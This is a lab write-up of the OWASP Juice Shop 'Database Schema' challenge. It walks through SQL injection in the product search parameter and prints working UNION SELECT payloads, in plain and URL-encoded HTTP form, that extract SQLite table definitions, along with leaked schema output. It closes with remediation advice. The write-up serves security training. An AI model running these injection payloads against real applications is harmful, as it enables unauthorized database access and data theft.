---
sidebar_label: 'Challenge: Database Schema'
---

# Challenge: Database Schema

**Category:** Injection · **Difficulty:** 3 stars

:::warning Authorized lab use only

This report uses my own Juice Shop training lab. Only repeat these steps in your own lab or with explicit permission. See the [project's safety guidance](../README.md#quickstart).

:::

## Task

The goal was to retrieve the database schema through SQL injection in my own Juice Shop lab. A schema describes the structure of the database, including its tables and columns.

I investigated the product search because it sends the search text to the server in the `q` parameter. My hypothesis was that this input might become part of a SQL query.

## Tests

I intercepted a product search and sent it to Burp Repeater. I changed the `q` value to find out whether the server treated my input only as search text or also as SQL.

| Test | Observed response | What I learned |
| --- | --- | --- |
| Search for `banana` | `200 OK`, with *Banana Juice* | This was my baseline: `q` controlled the search term, but SQL use was not yet proven. |
| Add a quote: `banana'` | `500 Internal Server Error`, with `SQLITE_ERROR` and `name LIKE '%banana'%'` | My input broke the SQL syntax. The error identified SQLite and exposed part of the query. |
| Close the string and parentheses: `banana'))--` | `200 OK`, with `data: []` | The query was valid again. The remaining `LIKE '%banana'` pattern searched for names ending in `banana`, which explained the empty result. |
| Add a `UNION SELECT` with nine fixed values, including `Probe` and `Nur ein Test` | `200 OK`, with `name: "Probe"` and `description: "Nur ein Test"` | Nine columns worked. The second test value appeared as `name`, and the third as `description`. |

The nine fields in the normal product response suggested a starting column count; the successful UNION test confirmed it. A `UNION` combines result rows from two queries, which must return the same number of columns. It does not add fields or save a new product. For background, see [PortSwigger's explanation of UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks).

Before querying the schema, I used this readable, URL-decoded `q` value to test the UNION method with fixed values:

```sql
banana')) UNION SELECT 0,'Probe','Nur ein Test',0,0,'',NULL,NULL,NULL--
```

I then URL-encoded the value and sent this request in Burp Repeater:

```http
GET /rest/products/search?q=banana%27%29%29%20UNION%20SELECT%200%2C%27Probe%27%2C%27Nur%20ein%20Test%27%2C0%2C0%2C%27%27%2CNULL%2CNULL%2CNULL-- HTTP/1.1
```

Because `Probe` appeared as `name`, I could use that same position to display a table definition in the next query.

## Solution

After the working UNION test, I needed to find where SQLite stores table definitions. The [SQLite SQL injection cheatsheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet) gave me `SELECT sql FROM sqlite_master WHERE type='table'`. Here, `sql` is the column in `sqlite_master` that contains a table's `CREATE TABLE` definition.

I adapted the working UNION test by replacing `Probe` with `sql` and adding `FROM sqlite_master WHERE type='table'` after the nine values.

My first attempt put `FROM` after `--`, which commented it out. The error response's separate `sql` property showed the generated query, not the schema column I wanted to read. Moving `FROM sqlite_master WHERE type='table'` before the comment produced this working search value:

```sql
banana')) UNION SELECT 0,sql,'Nur ein Test',0,0,'',NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
```

The value above is the readable, URL-decoded form of `q`. I used [CyberChef](https://gchq.github.io/CyberChef/) to prepare the URL-encoded form for the request, including its spaces and special characters. I then sent this request in Burp Repeater:

```http
GET /rest/products/search?q=banana%27%29%29%20UNION%20SELECT%200%2Csql%2C%27Nur%20ein%20Test%27%2C0%2C0%2C%27%27%2CNULL%2CNULL%2CNULL%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27-- HTTP/1.1
```

The payload works as follows:

| Part | Purpose |
| --- | --- |
| `banana'))` | The quote closes the original search string; `))` closes the two surrounding parentheses. |
| `UNION SELECT` with nine expressions | Adds rows matching the original query's column count. The eight fixed values fill the positions around `sql`. |
| `sql` in the second position | Reads a table's `CREATE TABLE` definition from `sqlite_master.sql`, displayed in the response's `name` field. |
| `FROM sqlite_master WHERE type='table'` | Reads schema entries for tables. |
| `--` | Comments out the remaining original query. |

## Result and Evidence

The response returned `200 OK`. This excerpt of its JSON body stops after `description`; line breaks were added for readability:

```text
"status":"success",
"data":[{
"id":0,
"name":"CREATE TABLE `Addresses` (
  `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE,
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `fullName` VARCHAR(255),
  `mobileNum` INTEGER,
  `zipCode` VARCHAR(255),
  `streetAddress` VARCHAR(255),
  `city` VARCHAR(255),
  `state` VARCHAR(255),
  `country` VARCHAR(255),
  `createdAt` DATETIME NOT NULL,
  `updatedAt` DATETIME NOT NULL)",
"description":"Nur ein Test",
```

The `name` field shows one table definition, while `description` still contains my test value. The excerpt does not show the complete schema response. Juice Shop then marked *Database Schema* as solved in my lab.

## Lessons Learned

The search input could change the SQL structure instead of remaining plain search text. Detailed database errors helped me understand and exploit that weakness. My investigation demonstrated access to table definitions; I did not test access to other data or changes to stored data.

Search values should be passed as bound SQL parameters so they cannot change the query structure. The application should also return generic errors to clients and keep detailed database errors in protected server logs.

[Back to Juice Shop Master](../README.md)
